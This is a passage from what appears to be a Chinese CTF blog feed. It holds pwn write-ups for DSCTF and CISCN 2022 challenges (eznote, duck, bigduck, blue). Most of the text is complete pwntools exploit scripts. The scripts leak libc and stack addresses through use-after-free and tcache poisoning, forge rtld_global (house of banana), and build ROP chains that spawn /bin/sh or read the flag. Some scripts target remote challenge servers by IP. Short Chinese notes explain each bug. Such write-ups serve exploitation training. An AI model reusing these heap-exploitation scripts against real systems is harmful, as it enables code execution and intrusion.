class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    m += i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, m)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">fd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Bit: &#x27;</span>)</span><br><span class="line">    fd += <span class="built_in">chr</span>(<span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u64(fd) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys_addr = libcbase + <span class="number">0x4f420</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h1 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h1><p><a href="https://imgtu.com/i/vKnezD"><img src="https://s1.ax1x.com/2022/08/07/vKnezD.jpg" alt="vKnezD.jpg"></a></p>
<p>程序一开始分配了0xa8大小的堆块来管理8个chunk的size，地址，内容的长度，这就导致了申请最后一个chunk时保存的size会把第一个chunk的size覆盖掉，这样就能打堆重叠了，然后再用house of banana getshell即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;43.142.31.245&#x27;</span></span><br><span class="line">port = <span class="number">28107</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0xca1</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x430</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x219ce0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">environ = libcbase + <span class="number">0x221200</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#heap3 &amp;&amp; chunk1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#1 and 2 uaf</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x870</span>, <span class="string">b&#x27;Leof&#x27;</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#to large bin </span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;Leof&#x27;</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">rtld_global = libcbase + <span class="number">0x264040</span></span><br><span class="line">heap_addr = key &lt;&lt; <span class="number">12</span></span><br><span class="line">payload = p64(libcbase + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(rtld_global - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;Leof&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libcbase + <span class="number">0x53A6D</span>         <span class="comment">#mov     rsp, [rdx+0A0h]</span></span><br><span class="line">ret = setcontext + <span class="number">0x14e</span> - <span class="number">61</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">fake_rtld_global_addr = heap_addr + <span class="number">0xb90</span></span><br><span class="line">fake_rtld_global = p64(<span class="number">0</span>) + p64(libcbase + <span class="number">0x265890</span>) + p64(<span class="number">0</span>) + p64(fake_rtld_global_addr)</span><br><span class="line">fake_rtld_global += p64(setcontext) + p64(ret)</span><br><span class="line">fake_rtld_global += p64(sh)</span><br><span class="line">fake_rtld_global += p64(ret)</span><br><span class="line">fake_rtld_global += p64(sys_addr)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line">fake_rtld_global += p64(pop_rdi)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span> - <span class="built_in">len</span>(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p64(fake_rtld_global_addr + <span class="number">0x10</span> + <span class="number">0x110</span>) * <span class="number">3</span></span><br><span class="line">fake_rtld_global += p64(<span class="number">0x10</span>)</span><br><span class="line">fake_rtld_global += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x31c</span> - <span class="number">0x10</span> - <span class="built_in">len</span>(fake_rtld_global))</span><br><span class="line">fake_rtld_global += p8(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, fake_rtld_global)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x400</span> + p64(fake_rtld_global_addr + <span class="number">0x20</span>))</span><br><span class="line">sa(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>DSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn-2022-华东北赛区pwn题复现</title>
    <url>/2022/06/29/ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>ciscn2022 华东北赛区pwn题复现</p>
<span id="more"></span>

<h1 id="duck"><a href="#duck" class="headerlink" title="duck"></a>duck</h1><p>2.34 uaf , 打environ泄露栈地址，覆盖返回地址为system(“&#x2F;bin&#x2F;sh”)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28060</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()               <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">96</span> - libc.sym[<span class="string">&#x27;main_arena&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sh = libcbase + <span class="number">0x1B4689</span></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2daa2</span></span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()               <span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">8</span>, p64(environ ^ key))</span><br><span class="line">add()   <span class="comment">#14</span></span><br><span class="line">add()   <span class="comment">#15 environ</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = uu64() - <span class="number">0x150</span>      <span class="comment">#ret_addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(stack - <span class="number">0x18</span> ^ key))</span><br><span class="line"></span><br><span class="line">add() <span class="comment">#16</span></span><br><span class="line">add()   <span class="comment">#17 ret_addr</span></span><br><span class="line">edit(<span class="number">17</span>, <span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_rdi) + p64(sh) + p64(sys_addr))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h1><p>2.33 uaf ,同样打environ泄露栈地址，覆盖返回地址构造orw</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28902</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()               <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">heap = key &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">malloc_hook = uu64() - <span class="number">96</span> - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0xc7f32</span></span><br><span class="line">read_addr = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libcbase + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">8</span>, p64(environ ^ key))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = uu64() - <span class="number">0x168</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(stack ^ key))</span><br><span class="line">add()</span><br><span class="line">add()       <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h1><p>程序只能show一次</p>
<p><img src="https://c.img.dasctf.com/images/2022720/1658312807707-6f58707b-5156-4c7c-9064-eb903974cbea.jpg"></p>
<p>这里有个隐藏的uaf，也是一次的</p>
<p>用这个uaf去泄露libc</p>
<p>先把tcache填满，利用再释放一个堆块进入unsorted bin泄露libc，然后释放一个堆块与该堆块合并，再去把tcache bin中的一个堆块取出来，接着再次释放前面uaf的堆块，这样就能做到unsorted bin和tcache的一个堆重叠，切割unsorted bin 就是任意地址写了</p>
<p>因为只能show一次，所以选择打stdout去泄露栈地址，最后构造orw拿到flag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>, 